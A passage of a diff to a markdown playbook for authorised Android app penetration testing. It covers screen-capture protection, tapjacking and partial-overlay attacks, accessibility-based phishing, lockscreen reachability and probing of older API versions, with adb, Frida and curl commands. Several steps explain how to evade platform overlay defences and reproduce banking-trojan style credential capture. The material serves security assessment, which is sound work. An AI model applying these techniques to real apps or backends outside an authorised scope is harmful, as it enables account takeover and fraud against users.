   adb shell dumpsys activity recents | grep -E 'Recent #|intent=|A=|baseIntent'
@@ -1647,12 +1734,19 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   coverage*, and the evidence is a differential.
 - **How:**
   ```bash
-  grep -rnE 'FLAG_SECURE|setFlags\(WindowManager\.LayoutParams\.FLAG_SECURE|addFlags\(.*FLAG_SECURE' out/sources/
+  grep -rnE 'FLAG_SECURE|setFlags\(WindowManager\.LayoutParams\.FLAG_SECURE|addFlags\(.*FLAG_SECURE' $DEC/jadx/sources/
   # per-window runtime check
   adb shell dumpsys window | grep -i secure
   # navigate to each sensitive screen and capture
   adb exec-out screencap -p > shot_card.png     # black frame => FLAG_SECURE is set
   adb shell screenrecord /sdcard/t.mp4          # refuses when FLAG_SECURE is set
+  # value-driven: for each FLAG_SECURE call site, take the value it protects (PAN, OTP, seed, balance) and find every OTHER renderer of that value
+  grep -rlE 'FLAG_SECURE' $DEC/jadx/sources/ | sort -u > secure-classes.txt                                   # protected screens
+  grep -rniE 'setText\([^)]*(pan|card|otp|seed|mnemonic|balance|iban)' $DEC/jadx/sources/ | grep -vF -f secure-classes.txt   # the second rendering
+  # a11y content-desc: FLAG_SECURE blanks pixels, not the node tree
+  adb shell uiautomator dump /sdcard/v.xml && adb pull /sdcard/v.xml && grep -oE 'content-desc="[^"]{4,}"|text="[^"]{4,}"' v.xml | grep -iE '[0-9]{4,}'
+  # detection is not prevention
+  grep -rnE 'registerScreenCaptureCallback|ScreenCaptureCallback' $DEC/jadx/sources/
   ```
   Enumerate every live activity's flag with one Frida pass (`0x2000` is `FLAG_SECURE`):
   ```javascript
@@ -1670,7 +1764,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```
 - **Proof:** The **differential**: a `screencap` that renders normally on the card/OTP screen next to a black
   capture on the login screen that does set the flag, plus the hook printing `FLAG_SECURE=false` for that
-  class. One capture on its own is not a finding; the pair is.
+  class. One capture on its own is not a finding; the pair is. Enumerate **values**, not only screens: the
+  same protected value drawn unprotected on a sibling route is the gap. A `uiautomator dump` that carries
+  the value while the `screencap` is black is a finding on its own — the a11y tree is readable by any enabled
+  accessibility service (D04-050). An app that only registers `ScreenCaptureCallback` (API 34) detects after
+  the fact and does not block `screencap`/`MediaProjection` — do not accept it as the control.
 - **Escalation:** Report it only with a named consumer — a screenshot-harvesting app, an accessibility or
   `MediaProjection`-holding co-resident, or a physical-access narrative — or as a verified negative. Play
   Integrity's `environmentDetails.appAccessRiskVerdict.appsDetected` names `KNOWN_CAPTURING` /
@@ -1728,7 +1826,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   Recents snapshot specifically.
 - **How:**
   ```bash
-  grep -rnE 'clearFlags\([^)]*FLAG_SECURE|setRecentsScreenshotEnabled|SurfaceView|setSecure\(|DialogProperties|SecureFlagPolicy' out/sources/
+  grep -rnE 'clearFlags\([^)]*FLAG_SECURE|setRecentsScreenshotEnabled|SurfaceView|setSecure\(|DialogProperties|SecureFlagPolicy' $DEC/jadx/sources/
   ```
   On device, capture at three moments: mid-transition into the secure screen, while a `SurfaceView` is
   rendering, and with a Compose dialog open over a secure activity.
@@ -1757,21 +1855,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Requires** | targetsdk>=36, device |
 | **Maps to** | `about/versions/16/behavior-changes-16` — for displays with `smallestWidth >= 600dp`, `android:screenOrientation`, `android:resizableActivity`, `android:minAspectRatio`, `android:maxAspectRatio` and `Activity#setRequestedOrientation()` are ignored; opt-out `<property android:name="android.window.PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY" android:value="true"/>` is temporary and does not apply at API 37+ |
 
-- **Test:** Apps that masked a field, truncated a PAN, or positioned a security affordance assuming fixed
-  portrait geometry now render differently on tablets and foldables. This is disclosure by layout on a form
-  factor the developer never tested.
-- **How:**
-  ```bash
-  grep -nE 'screenOrientation|minAspectRatio|maxAspectRatio|resizeableActivity|PROPERTY_COMPAT_ALLOW_RESTRICTED_RESIZABILITY' out/AndroidManifest.xml
-  ```
-  Install on an `sw600dp`+ AVD, rotate, and compare against the phone layout screen by screen.
-- **Proof:** A masked card number or an otherwise-hidden pane fully visible in landscape on a large screen,
-  side by side with the portrait capture that hid it.
-- **Escalation:** -> D20 privacy. Pair with D04-042 where the newly-visible pane is also not `FLAG_SECURE`.
-- **Ruled out when:** `targetSdkVersion < 36`, or the layouts are genuinely responsive and the masking is
-  implemented in the data layer (the view never receives the unmasked value) rather than by layout — verified
-  by the large-screen capture showing the same masking.
-
+- **Test:** Covered by D22-051; this row keeps the sweep honest. Activity-side input only: the exported or post-auth activities whose portrait layout masks a field (`screenOrientation`/`minAspectRatio`/`maxAspectRatio` in the register from D04-001) are the screens D22-051 captures on the `sw600dp`+ device.
+- **How:** see D22-051 — run it once there; record the activity-side fact in `inventory/components.csv` notes and the `D04-045` row as `covered-by D22-051`.
+- **Proof:** as D22-051.
+- **Escalation:** -> D22-051; pair with D04-042 where the newly-visible pane is also not `FLAG_SECURE`.
+- **Ruled out when:** as D22-051 — the mechanism and the controlled experiment live there; this row closes when that row closes.
 ### D04-046 · Edge-to-edge enforcement (targetSdk 35/36) hides the material terms of a confirmation
 
 | | |
@@ -1783,24 +1871,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Requires** | targetsdk>=35, device |
 | **Maps to** | `about/versions/15/behavior-changes-15` (edge-to-edge default, `Window.setStatusBarColor()` and friends are no-ops, `Configuration.screenWidthDp/screenHeightDp/orientation` now include the system bars); `about/versions/16/behavior-changes-16` (`R.attr#windowOptOutEdgeToEdgeEnforcement` deprecated and disabled) |
 
-- **Test:** At targetSdk 35 all apps are edge-to-edge by default; at 36 the opt-out is disabled entirely.
-  Security-relevant UI — a transaction amount, a recipient name, a consent sentence, a "secure connection"
-  indicator — can now be drawn under the status or navigation bar while the confirm button stays tappable.
-  That is UI redress by layout rather than by overlay, and the user authorises an action whose terms they
-  cannot read.
-- **How:**
-  ```bash
-  grep -rnE 'windowOptOutEdgeToEdgeEnforcement|setDecorFitsSystemWindows|setStatusBarColor|WindowInsets' out/res out/sources/
-  ```
-  Run the app on Android 15 and 16 with gesture navigation and again with three-button navigation; capture
-  both.
-- **Proof:** A screenshot showing the confirmation amount or consent text clipped behind the system bar while
-  the confirm button remains tappable.
-- **Escalation:** -> D23 payment-confirmation ambiguity. Combine with D04-048 (partial occlusion): if the app
-  already hides the amount by layout, the attacker only needs to cover the recipient.
-- **Ruled out when:** Every confirmation screen applies `WindowInsets` padding so the material terms sit
-  inside the safe area on both navigation modes — verified by capturing both modes on an Android 16 device.
-
+- **Test:** Covered by D22-051; this row keeps the sweep honest. Activity-side input only: the confirmation and consent activities from the register are the screens D22-051 captures under gesture and three-button navigation.
+- **How:** see D22-051 — run it once there; record the activity-side fact in `inventory/components.csv` notes and the `D04-046` row as `covered-by D22-051`.
+- **Proof:** as D22-051.
+- **Escalation:** -> D22-051; -> D23 payment-confirmation ambiguity; combine with D04-048 (partial occlusion) when the amount is already hidden by layout.
+- **Ruled out when:** as D22-051 — the mechanism and the controlled experiment live there; this row closes when that row closes.
 ### D04-047 · Classic full-occlusion tapjacking — and verifying whether the platform already stops it
 
 | | |
@@ -1822,8 +1897,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   flag missing, and does a tap actually land.
 - **How:**
   ```bash
-  grep -rnE 'filterTouchesWhenObscured|setFilterTouchesWhenObscured|onFilterTouchEventForSecurity|FLAG_WINDOW_IS_(PARTIALLY_)?OBSCURED|setHideOverlayWindows|accessibilityDataSensitive' out/res/layout/ out/sources/
-  grep -iE 'HIDE_OVERLAY_WINDOWS|SYSTEM_ALERT_WINDOW' out/AndroidManifest.xml
+  grep -rnE 'filterTouchesWhenObscured|setFilterTouchesWhenObscured|onFilterTouchEventForSecurity|FLAG_WINDOW_IS_(PARTIALLY_)?OBSCURED|setHideOverlayWindows|accessibilityDataSensitive' $DEC/apktool/res/layout/ $DEC/jadx/sources/
+  grep -iE 'HIDE_OVERLAY_WINDOWS|SYSTEM_ALERT_WINDOW' $DEC/apktool/AndroidManifest.xml
   # the platform half
   adb shell settings get global block_untrusted_touches     # 2 = block (default on 12+)
   adb shell appops set com.poc.overlay SYSTEM_ALERT_WINDOW allow
@@ -1868,8 +1943,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   `MotionEvent.FLAG_WINDOW_IS_PARTIALLY_OBSCURED`, and almost nobody does.
 - **How:**
   ```bash
-  grep -rn 'FLAG_WINDOW_IS_PARTIALLY_OBSCURED\|FLAG_WINDOW_IS_OBSCURED' out/sources/
-  grep -rn 'setHideOverlayWindows' out/sources/
+  grep -rn 'FLAG_WINDOW_IS_PARTIALLY_OBSCURED\|FLAG_WINDOW_IS_OBSCURED' $DEC/jadx/sources/
+  grep -rn 'setHideOverlayWindows' $DEC/jadx/sources/
   ```
   Build the overlay to cover only the transaction detail, leaving a hole over the confirm control, and keep
   the overlay's own alpha below 0.8 so the API 31 threshold is not tripped.
@@ -1952,17 +2027,19 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   adb shell dumpsys accessibility | grep "Accessibility Service"
   adb shell pm list packages -3 -e BIND_ACCESSIBILITY_SERVICE
   # the app-side defence, API 34+
-  grep -rn 'accessibilityDataSensitive' out/res/layout/ out/sources/
+  grep -rn 'accessibilityDataSensitive' $DEC/apktool/res/layout/ $DEC/jadx/sources/
   ```
 - **Proof:** The phishing view rendering full-screen over the target while the target still receives the
   gestures (the real transaction completes), and **no `SYSTEM_ALERT_WINDOW` prompt was ever shown**.
 - **Escalation:** High to Critical for banking and wallet targets — credential and OTP capture with the real
   transaction executing underneath, which is the standard banking-trojan chain. The reportable app-side gap
   is the set of missing defences: `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API
-  34+, and note it is implicitly enabled by `android:filterTouchesWhenObscured="true"` from Android 16) on
+  34+; in its default `auto` state the platform infers `yes` for any view that sets
+  `filterTouchesWhenObscured="true"` or whose parent is data-sensitive, so a touch-filtered view is already
+  a11y-hidden on 14+ unless the app set `accessibilityDataPrivateNo`) on
   sensitive views, missing `setFilterTouchesWhenObscured(true)` and `FLAG_SECURE`, and no refusal to operate
   while a non-trusted accessibility service is active.
-- **Ruled out when:** Sensitive views set `accessibilityDataSensitive` (or `filterTouchesWhenObscured`, which
+- **Ruled out when:** Sensitive views set `accessibilityDataSensitive` (or `filterTouchesWhenObscured`, which on API 34+ `auto`-infers it
   implies it on Android 16) **and** the app declines to render the confirmation while an untrusted
   accessibility service is enabled — verified by enabling a stub service and observing the refusal.
 
@@ -1989,13 +2066,13 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```bash
   python3 - <<'PY'
   import xml.dom.minidom as m
-  d = m.parse('out/AndroidManifest.xml'); NS='android'
+  d = m.parse('$DEC/apktool/AndroidManifest.xml'); NS='android'
   for a in d.getElementsByTagName('activity'):
       if a.getAttribute(f'{NS}:exported') == 'true' and \
          a.getAttribute(f'{NS}:launchMode') not in ('singleInstance', 'singleInstancePerTask'):
           print('TAPTRAP-CANDIDATE', a.getAttribute(f'{NS}:name'))
   PY
-  grep -rn 'overridePendingTransition\|makeCustomAnimation' out/sources/
+  grep -rn 'overridePendingTransition\|makeCustomAnimation' $DEC/jadx/sources/
   adb shell getprop ro.build.version.security_patch
   ```
 - **Proof:** A screen recording in which the visible UI is the attacker's decoy while a tap lands on the
@@ -2036,11 +2113,18 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```
 - **Proof:** `dumpsys activity activities` showing both activities in one task with the attacker on top, plus
   a screen recording of the blended UI and the victim's action completing.
-- **Escalation:** -> D13 credential phishing. Combine with D04-030 so the victim activity you sandwich is a
-  resurfaced mid-flow confirmation.
+- **Escalation:** The sandwich is the timing oracle D04-048/-049 lack: you *placed* the victim activity, so
+  you know when its confirm control is on screen. Severity is set only by what is underneath — an in-app
+  credential field, or an irreversible action that does not terminate in a system prompt. -> D13 credential
+  phishing. Combine with D04-030 so the victim activity you sandwich is a resurfaced mid-flow confirmation.
+  On Android 16 the sandwich still reproduces against an app that has not set
+  `android:allowCrossUidActivitySwitchFromBelow="false"` (D04-035).
 - **Ruled out when:** The sensitive activity is `exported="false"` (so you cannot place it), or it is
   `launchMode="singleInstance"` so it cannot share a task with your decoy — verified by the `dumpsys` output
-  showing two distinct tasks.
+  showing two distinct tasks. Also P5-and-parked (not ruled out) when every irreversible action in the
+  sandwiched activity ends in a system `BiometricPrompt`/keyguard-credential dialog (an overlay cannot pass
+  touches to it) and the app has no in-app credential entry — record `parked: sandwich reproduces on API <n>
+  without the cross-UID opt-in; no phishable field` and link it from D04-035.
 
 ### D04-053 · `Window.setHideOverlayWindows(true)` absent on the screens that authorise something
 
@@ -2059,9 +2143,9 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   cite alongside D04-048 — because touch filtering alone does not address partial occlusion.
 - **How:**
   ```bash
-  grep -rn 'setHideOverlayWindows' out/sources/
-  grep -n 'HIDE_OVERLAY_WINDOWS' out/AndroidManifest.xml
-  xmlstarlet sel -t -v "//uses-sdk/@android:targetSdkVersion" -n out/AndroidManifest.xml
+  grep -rn 'setHideOverlayWindows' $DEC/jadx/sources/
+  grep -n 'HIDE_OVERLAY_WINDOWS' $DEC/apktool/AndroidManifest.xml
+  xmlstarlet sel -t -v "//uses-sdk/@android:targetSdkVersion" -n $DEC/apktool/AndroidManifest.xml
   adb shell dumpsys window windows | grep -E 'mOwnerUid|Window\{|mAttrs' | head -40
   ```
 - **Proof:** The API level supports it, the permission is absent from the manifest, and your overlay from
@@ -2091,12 +2175,12 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   `OnBackInvokedCallback` / `OnBackPressedCallback`.
 - **How:**
   ```bash
-  grep -rn 'onBackPressed\|KEYCODE_BACK' out/sources/ | grep -v 'OnBackPressedCallback\|OnBackInvokedCallback'
-  grep -n 'enableOnBackInvokedCallback' out/AndroidManifest.xml
+  grep -rn 'onBackPressed\|KEYCODE_BACK' $DEC/jadx/sources/ | grep -v 'OnBackPressedCallback\|OnBackInvokedCallback'
+  grep -n 'enableOnBackInvokedCallback' $DEC/apktool/AndroidManifest.xml
   ```
   Then on an Android 16 device with targetSdk 36, drive the screen and swipe back while watching state:
   ```bash
-  frida -D "$SERIAL" -n com.target.app -e 'Java.perform(function(){var A=Java.use("com.target.app.PinActivity");A.clearBuffer.implementation=function(){console.log("clearBuffer CALLED");return this.clearBuffer();};});'
+  frida -D "$SERIAL" -n com.target.app -q -t 30 -e 'Java.perform(function(){var A=Java.use("com.target.app.PinActivity");A.clearBuffer.implementation=function(){console.log("clearBuffer CALLED");return this.clearBuffer();};});'
   ```
 - **Proof:** A sensitive screen that previously cleared its buffer or re-locked on Back now exits with state
   intact — the Frida hook on the clearing method showing it is never invoked, or re-entering the app and
@@ -2123,7 +2207,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   regardless — so the confirmation dialog appears and the activity finishes at the same time.
 - **How:**
   ```bash
-  grep -rn 'PRIORITY_SYSTEM_NAVIGATION_OBSERVER' out/sources/ -B6 -A10
+  grep -rn 'PRIORITY_SYSTEM_NAVIGATION_OBSERVER' $DEC/jadx/sources/ -B6 -A10
   ```
   Drive the screen the callback guards and swipe back.
 - **Proof:** The confirm dialog appearing while the activity simultaneously finishes — recorded, and
@@ -2140,7 +2224,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Severity ceiling** | High |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if it reaches the account |
 | **Attacker** | AM-10 physical locked; AM-03 where an installed app supplies the trigger |
-| **Applies to** | all. Android 15+ restricts *background* activity launches, so trigger it with a foreground-equivalent path (notification action, Quick Settings tile, NFC tag, USB attach) and say which you used |
+| **Applies to** | all. Background activity starts are blocked for third-party apps from API 29 (tightened at 34/35), so from the attacker side the trigger must be a foreground-equivalent path — the PoC's own `showWhenLocked` activity started while the PoC is visible, a notification action, a Quick Settings tile, an NFC tag, a USB attach — and the report says which you used. (D25-054 is the OEM-surface twin; this item owns the method.) |
 | **Requires** | physical, device |
 | **Maps to** | `guide/topics/manifest/activity-element` (`android:showWhenLocked`); `frameworks/base` `KeyguardManager.requestDismissKeyguard` javadoc, verbatim: "The activity must either be visible by using `android.R.attr#showWhenLocked` or `Activity#setShowWhenLocked(boolean)`, or must be in a state in which it would be visible if Keyguard would not be hiding it"; AOSP rates lockscreen bypass **High** |
 
@@ -2150,18 +2234,25 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   reachability or navigation out of it.
 - **How:**
   ```bash
-  grep -nE 'showWhenLocked|turnScreenOn' out/AndroidManifest.xml
-  grep -rnE 'setShowWhenLocked|setTurnScreenOn|FLAG_SHOW_WHEN_LOCKED|FLAG_DISMISS_KEYGUARD|requestDismissKeyguard' out/sources/
-  # the device must have a real PIN set
+  grep -nE 'showWhenLocked|turnScreenOn' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'setShowWhenLocked|setTurnScreenOn|FLAG_SHOW_WHEN_LOCKED|FLAG_DISMISS_KEYGUARD|requestDismissKeyguard|setInheritShowWhenLocked|inheritShowWhenLocked' $DEC/jadx/sources/   # inheritShowWhenLocked = the second hop
+  # the device must have a real PIN set. Discovery (AM-10/AM-12 only — the shell is BAL-exempt, so a render here proves nothing about AM-03):
   adb shell input keyevent 26                       # screen off / lock
-  adb shell am start -n com.target.app/.TheActivity -a <its action>
+  adb shell am start -W -n com.target.app/.TheActivity -a <its action>
   adb shell input keyevent 224                      # wake
   adb exec-out screencap -p > locked.png
+  # AM-03: the zero-permission PoC declares its own showWhenLocked LockActivity, starts it while visible, and
+  # after a 10 s delay (the device locked meanwhile) calls startActivity on the target component FROM that
+  # visible activity; the negative control — the same start from the PoC's background service — must log BAL_BLOCK
+  adb shell am start -S -W -n com.poc.zeroperm/.LockActivity; sleep 3; adb shell input keyevent 26; sleep 12
+  adb exec-out screencap -p > locked-am03.png
+  adb logcat -d -s ActivityTaskManager | grep -oE 'BAL_[A-Z_]+|realCallerStartMode=[A-Z_]+'
   adb shell dumpsys window | grep -E 'mDreamingLockscreen|KeyguardController|showWhenLocked'
   ```
   Then try to navigate **out** of it: Back, Recents, any in-activity link, and any `startActivity` it makes.
-- **Proof:** `locked.png` showing app content with the keyguard still active, plus the `dumpsys window` lines
-  confirming the keyguard was up. The stronger finding is the second hop: reaching an activity that is *not*
+- **Proof:** `locked-am03.png` (the launch made by the PoC's visible `showWhenLocked` activity, not by the
+  shell) showing app content with the keyguard still active, plus the `dumpsys window` lines confirming the
+  keyguard was up and the `BAL_BLOCK` line from the background control. The stronger finding is the second hop: reaching an activity that is *not*
   itself `showWhenLocked` from the one that is — that is a keyguard-bypass shape.
 - **Escalation:** Pre-unlock reachability plus a deep-link router (D04-058) gives a locked-device attacker
   arbitrary in-app routes -> D09; chain with the NFC/USB triggers in D25 for a no-touch version. Note the
@@ -2183,27 +2274,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Requires** | device |
 | **Maps to** | `guide/topics/manifest/activity-element` — `android:showForAllUsers` makes an activity display when the current user differs from the launching user; `android:directBootAware`, "during Direct Boot, activity can only access device-protected storage" |
 
-- **Test:** Either attribute on a data-rendering component is a boundary crossing: `showForAllUsers` shows
-  one profile's content in another's session, and `directBootAware` makes a component run **before first
-  unlock**, where only device-protected storage is available — which is exactly where a developer should not
-  have put user data.
-- **How:**
-  ```bash
-  grep -nE 'showForAllUsers|directBootAware' out/AndroidManifest.xml
-  adb shell pm list users
-  adb shell am start --user 10 -n com.target.app/.TheActivity     # secondary / work profile user
-  adb reboot && adb wait-for-device
-  adb shell am start -n com.target.app/.TheActivity               # before unlock
-  adb exec-out screencap -p > preunlock.png
-  ```
-- **Proof:** The activity rendering user content on the lock screen pre-unlock, or under a different Android
-  user id — captured with `pm list users` output showing which user id you were.
-- **Escalation:** -> D25 private space / work profile boundary crossing; -> D11 for whatever the app placed
-  in device-protected storage to make direct-boot work.
-- **Ruled out when:** Neither attribute appears, or the only `directBootAware` component is a receiver that
-  schedules work without reading user data — verified by the pre-unlock launch rendering an empty or
-  "unlock to continue" state.
-
+- **Test:** Covered by D03-039 (directBootAware) / D25 (`showForAllUsers`, the cross-user boundary); this row keeps the sweep honest. Activity-side input only: the data-rendering activities carrying either attribute (`grep -nE 'showForAllUsers|directBootAware' $DEC/apktool/AndroidManifest.xml`) are the rows D03-039 probes before first unlock and D25 probes under a second user id (`adb shell am start --user 10 -n …`).
+- **How:** see D03-039 (directBootAware) / D25 (`showForAllUsers`, the cross-user boundary) — run it once there; record the activity-side fact in `inventory/components.csv` notes and the `D04-057` row as `covered-by D03-039`.
+- **Proof:** as D03-039 (directBootAware) / D25 (`showForAllUsers`, the cross-user boundary).
+- **Escalation:** -> D03-039 (pre-unlock) and -> D25 (private space / work profile boundary); -> D11 for whatever the app placed in device-protected storage.
+- **Ruled out when:** as D03-039 (directBootAware) / D25 (`showForAllUsers`, the cross-user boundary) — the mechanism and the controlled experiment live there; this row closes when that row closes.
 ### D04-058 · Map the deep-link trampoline / router activity's route table before testing anything downstream
 
 | | |
@@ -2222,8 +2297,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   manifest.
 - **How:**
   ```bash
-  grep -nE '<data[^>]*(scheme|host|pathPrefix)=' out/AndroidManifest.xml | sort -u
-  grep -rn 'getIntent()\.getData()' out/sources/ -A20 | grep -nE 'getQueryParameter|getHost|getPath|switch'
+  grep -nE '<data[^>]*(scheme|host|pathPrefix)=' $DEC/apktool/AndroidManifest.xml | sort -u
+  grep -rn 'getIntent()\.getData()' $DEC/jadx/sources/ -A20 | grep -nE 'getQueryParameter|getHost|getPath|switch'
   adb shell dumpsys package com.target.app | sed -n '/Schemes:/,/^$/p'
   ```
   Produce a table: **route name · target activity or action · parameters consumed · auth required**.
@@ -2260,7 +2335,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   # tap the notification, then:
   adb logcat -d | grep -i 'Indirect notification activity start (trampoline) from'
   adb shell am compat enable NOTIFICATION_TRAMPOLINE_BLOCK com.target.app    # debuggable builds
-  grep -rn 'setContentIntent(\|addAction(' out/sources/ -B6 | grep -n 'FLAG_MUTABLE'
+  grep -rn 'setContentIntent(\|addAction(' $DEC/jadx/sources/ -B6 | grep -n 'FLAG_MUTABLE'
   ```
   Expected string: `Indirect notification activity start (trampoline) from PACKAGE_NAME`.
 - **Proof:** The logcat line naming the target package and the receiver or service it came from — which is
@@ -2362,7 +2437,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   adb shell pidof com.target.app
   adb shell am start -n com.target.app/.CrashyActivity          # no data, no extras
   adb shell pidof com.target.app                                # changed => you control restarts
-  grep -rnE 'new Random\(|System\.currentTimeMillis\(\)|SecureRandom\(\)' out/sources/
+  grep -rnE 'new Random\(|System\.currentTimeMillis\(\)|SecureRandom\(\)' $DEC/jadx/sources/
   ```
 - **Proof:** `FATAL EXCEPTION` attributable to the component **and** `pidof` returning a different value —
   the pair proves you have a restart oracle rather than just a crash.
@@ -2381,13 +2456,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (P3) for the availability half |
 | **Attacker** | AM-03 |
 | **Applies to** | From **Android 10** the OS shows a synthesised launcher entry pointing at the app's settings page unless the app is a system app, requests no permissions, has no launcher activity, or is in a managed device/work-profile context — so full concealment is **LEGACY** except in those four carve-outs, which are exactly where to test it |
+| **Requires** | — |
 | **Maps to** | ATT&CK T1628.001 Suppress Application Icon ("Hiding the application's icon programmatically does not require any special permissions"), T1628, detection DET0640/AN1715 which correlates "visibility reductions (icon suppression, launcher disablement) with continued application execution" |
 
 - **Test:** Can any exported component — or the app's own logic driven by an attacker-controlled extra —
   reach `PackageManager.setComponentEnabledSetting` and disable the launcher activity or its alias?
 - **How:**
   ```bash
-  grep -rnE 'setComponentEnabledSetting|COMPONENT_ENABLED_STATE_DISABLED|COMPONENT_ENABLED_STATE_DEFAULT' out/sources/ -B10 \
+  grep -rnE 'setComponentEnabledSetting|COMPONENT_ENABLED_STATE_DISABLED|COMPONENT_ENABLED_STATE_DEFAULT' $DEC/jadx/sources/ -B10 \
     | grep -nE 'getIntent|getStringExtra|getBooleanExtra'
   adb shell pm dump com.target.app | grep -nE 'enabled=|disabledComponents'
   ```
@@ -2411,36 +2487,32 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Attacker** | AM-01 / AM-06 (the API is reachable from `curl`) |
 | **Applies to** | any versioned API behind a mobile client |
 | **Requires** | backend-api |
-| **Maps to** | claude-bughunter `hunt-shadow-api` Stages 1 & 3 plus its severity table; explicit chain from `apk-redteam-pipeline` |
+| **Maps to** | D15-012 (owner of the behavioural version diff); the shadow-API bridge pattern (an older mobile-only API version with weaker controls than the current web client's) |
+| **Record** | logs/D04-064.txt (the grep run and, when in scope, the reachability codes); logs/D04-064-versions.txt (every versioned path, header and media-type string the activities' code reaches, with file:line) |
 
-- **Test:** The highest-value bridge from this chapter into the backend. A mobile app's hardcoded backend
-  calls are frequently an **older API version** than the current web app uses, kept alive for old clients and
-  never given the same fixes — weaker auth, weaker rate limits, weaker input validation, more field exposure.
-  Every endpoint you recovered from an exported activity in D04-007/-010 is a version-diff candidate.
-- **How:**
+- **Skip when:** `jq -r '.authorisation.scope' "$E/engagement.json"` excludes the backend → the app-side half
+  below still runs; record the row as `blocked: backend out of scope; app-side inventory done: versioned
+  path strings <list> (logs/D04-064-versions.txt)`, never as `ruled-out`.
+- **Test:** Every endpoint you recovered from an exported activity in D04-007/-010 is a version-diff
+  candidate: a mobile app's hardcoded backend calls are frequently an **older API version** than the current
+  web app uses, kept alive for old clients and never given the same fixes. This item is the **feeder**: it
+  writes the activity-side version inventory and hands it to D15-012, which owns the behavioural diff (auth
+  strength, rate limiting, input validation, field exposure) and the exploitation — do not repeat that here.
+- **How:** App-side half, always:
   ```bash
-  # the versions the activity actually calls
-  grep -rnE 'https?://[^"]+/v[0-9]+/|X-API-Version|Accept: application/vnd' out/sources/ | sort -u
-  for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
-    curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
-  done
-  curl -s -H "X-API-Version: 1" https://$TARGET/api/users
-  curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users
+  # the versions the activities actually call — written to the log, one row per string with file:line
+  grep -rnE 'https?://[^"]+/v[0-9]+/|/api/v[0-9]+|X-API-Version|Accept: application/vnd' $DEC/jadx/sources | sort -u | tee logs/D04-064-versions.txt
   ```
-  Then diff **behaviour**, not response shape, for the *same operation* across versions: does v1 accept no
-  token, an expired token, or a lower-privilege token that v2 rejects? Does v1 return no `429` under a burst
-  that v2 throttles? Does v1 accept a payload v2 validates? Does v1 return internal ids or PII the current
-  version redacts?
-- **Proof:** The same request against both versions side by side, with a **body** diff — not a status-code
-  diff. A byte-identical 200 is not a bypass. For the rate-limit half, sample at least 100 attempts and
-  distinguish per-IP, per-account, per-session and per-username throttling before claiming absence; for any
-  timing claim, n >= 10 interleaved trials per group with the suspect group's mean >= 2σ above control.
-- **Escalation:** -> D15. **A version difference alone is Informational — the weakened control is the
-  finding.** Say which control regressed in the title.
-- **Ruled out when:** Every version the app can reach enforces the same auth, the same throttle and the same
-  field redaction as the current one, demonstrated with the paired requests. An old version that 404s or
-  refuses connection is not reachable and is a clean negative; anything else is live.
-
+  Backend half, only when the scope includes the backend — the probing itself is D15-012's:
+  ```bash
+  for v in v1 v2 v3 v4 beta alpha internal legacy old; do curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"; done   # reachability only; the diff is D15-012
+  ```
+- **Proof:** `logs/D04-064-versions.txt` — the list, with the exported activity each string was reached
+  from — and, when the backend is in scope, the reachability codes next to it.
+- **Escalation:** -> D15-012 runs the four behavioural diffs on this list and files the weakened control; a
+  version difference alone is **Informational**.
+- **Ruled out when:** n/a — feeder. The inventory is either written or the item is incomplete; "the old
+  version enforces the same controls" is D15-012's negative. Out-of-scope backend → `blocked`, as above.
 ### D04-065 · Evidence: the five-screenshot pattern for an exported-activity state change
 
 | | |
@@ -2449,44 +2521,14 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | governs every state-changing finding in this chapter |
 | **Attacker** | n/a |
 | **Applies to** | D04-010, -011, -012, -019, -061, -063 and every chained outcome |
+| **Requires** | — |
 | **Maps to** | claude-bughunter `evidence-hygiene` §7 (five-screenshot pattern), §§2, 4, 5, 6, 8 (redaction) |
 
-- **Test:** A state change needs pre-state, the bug, and post-state — plus the out-of-band side effect. An
-  exported-activity finding without the post-state reads as a screenshot of a screen.
-- **How:** Capture in one sitting, without reloading pages between shots (reloads regenerate cookies and
-  invalidate prior captures). Name files `{finding-#}-step{n}-{description}.png` and reference them by
-  filename in the report body:
-  1. **Pre-state verification** — the victim account showing the original value.
-  2. **The bug itself** — the `am start` (or the PoC app's logcat) and the change succeeding without auth.
-     This is the most important shot.
-  3. **Post-state negative** — the old value no longer valid.
-  4. **Post-state positive** — the attacker's value now in force.
-  5. **Side effect** — the notification email/inbox, or its absence, which proves whether passive defence
-     exists.
-  ```bash
-  adb exec-out screencap -p > 04-step2-exported-activity-state-change.png
-  adb shell screenrecord --time-limit 30 /sdcard/poc.mp4 && adb pull /sdcard/poc.mp4
-  ```
-  Sanitise the HAR before attaching:
-  ```bash
-  jq '.log.entries |= map(
